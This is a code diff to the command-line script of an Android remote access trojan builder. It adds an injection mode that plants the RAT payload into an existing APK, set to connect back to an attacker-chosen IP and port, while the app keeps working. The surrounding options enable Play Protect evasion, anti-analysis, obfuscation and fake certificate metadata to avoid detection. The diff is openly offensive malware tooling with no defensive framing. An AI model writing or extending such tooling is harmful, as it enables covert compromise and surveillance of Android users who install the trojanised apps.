@@ -44,6 +44,8 @@ parser.add_argument('--anti-analysis',help='Enable advanced anti-analysis and sa
 parser.add_argument('--play-protect-evasion',help='Enable Play Protect specific evasion techniques',action='store_true')
 parser.add_argument('--advanced-obfuscation',help='Apply advanced string and code obfuscation',action='store_true')
 parser.add_argument('--fake-certificates',help='Use fake certificate metadata for trust evasion',action='store_true')
+parser.add_argument('--inject',help='Inject RAT into existing APK instead of building new one',action='store_true')
+parser.add_argument('--target-apk',metavar="<APK Path>", type=str,help='Path to target APK for injection')
 args = parser.parse_args()
 
 
@@ -59,8 +61,40 @@ if args.build:
     port_ = args.port
     icon=True if args.icon else None
     
-    # Handle tunneling options
-    if args.ngrok or args.tunnel:
+    # Check for injection mode
+    if args.inject:
+        if not args.target_apk:
+            print(stdOutput("error")+"\033[1m--target-apk required when using --inject")
+            sys.exit()
+        if not args.ip or not args.port:
+            print(stdOutput("error")+"\033[1mArguments Missing: -i and -p required for injection")
+            sys.exit()
+        if not args.output:
+            print(stdOutput("error")+"\033[1m-o (output) required for injection mode")
+            sys.exit()
+            
+        # Create evasion options dictionary for injection
+        evasion_options = {
+            'stealth': args.stealth,
+            'random_package': args.random_package,
+            'anti_analysis': args.anti_analysis if hasattr(args, 'anti_analysis') else False,
+            'play_protect_evasion': args.play_protect_evasion if hasattr(args, 'play_protect_evasion') else False,
+            'advanced_obfuscation': args.advanced_obfuscation if hasattr(args, 'advanced_obfuscation') else False,
+            'fake_certificates': args.fake_certificates if hasattr(args, 'fake_certificates') else False
+        }
+        
+        print(stdOutput("info")+"\033[1mStarting APK injection mode...")
+        success = inject_rat_into_apk(args.target_apk, args.ip, args.port, args.output, evasion_options)
+        
+        if success:
+            print(stdOutput("success")+"\033[1mAPK injection completed successfully!")
+            print(stdOutput("info")+"\033[92mTarget app functionality preserved with RAT payload injected!")
+        else:
+            print(stdOutput("error")+"\033[1mAPK injection failed!")
+            sys.exit()
+    
+    # Handle tunneling options (original build mode)
+    elif args.ngrok or args.tunnel:
         port = 8000 if not port_ else int(port_)
         
         # Determine which tunneling service to use
